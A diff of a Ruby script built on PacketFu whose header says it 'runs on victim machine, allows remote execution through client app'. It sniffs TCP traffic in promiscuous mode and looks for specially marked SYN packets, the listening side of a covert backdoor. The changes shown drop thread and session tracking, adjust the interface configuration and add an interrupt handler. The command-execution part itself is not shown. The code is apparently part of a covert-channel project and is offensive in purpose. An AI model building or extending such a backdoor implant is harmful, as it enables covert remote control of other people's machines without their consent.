@@ -1,7 +1,6 @@
 # Runs on victim machine, allows remote execution through client app
 require 'rubygems'
 require 'packetfu'
-require 'thread'
 
 include PacketFu
 
@@ -128,22 +127,16 @@ end
 loadConfig("/path/to/file.txt")
 
 #$config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> iName)).config # set interface
-$config = PacketFu::Config.new(:iface=> $iName).config # use this line instead of above if you face `whoami?': uninitialized constant PacketFu::Capture (NameError)
+#$config = PacketFu::Config.new(:iface=> $iName).config # use this line instead of above if you face `whoami?': uninitialized constant PacketFu::Capture (NameError)
 
 #TODO: Mask process name from config
-
-# Create sessions array (Holds threads)
-sessions = []
-
-begin 
+begin
 	# Start listening for connection packets via TCP
 	print "starting up\n"
-	capturedTCP = PacketFu::Capture.new(:iface => $config[:iface], :start => true, :promisc => true, :filter => "tcp")
-	print "about to capture\n"
-	
-	capturedTCP.stream.each { |packet|
-		puts "Got one!"
-		pkt = Packet.parse packet
+	$stdout.flush
+	capturedTCP = PacketFu::Capture.new(:iface => $iName, :start => true, :promisc => true, :filter => "tcp")
+	capturedTCP.stream.each { |pack|
+		pkt = Packet.parse pack
 		# Check that it is a TCP packet?
 		if pkt.is_tcp?
 			# Is it one of our SYN packets?
@@ -158,6 +151,7 @@ begin
 			end
 		end
 	}
-
+	rescue Interrupt
+	puts "Interrupted by User"
+	exit 0
 end
-Signal.trap('TSTP') { puts "Force Exiting..."; ::Process.exit! }
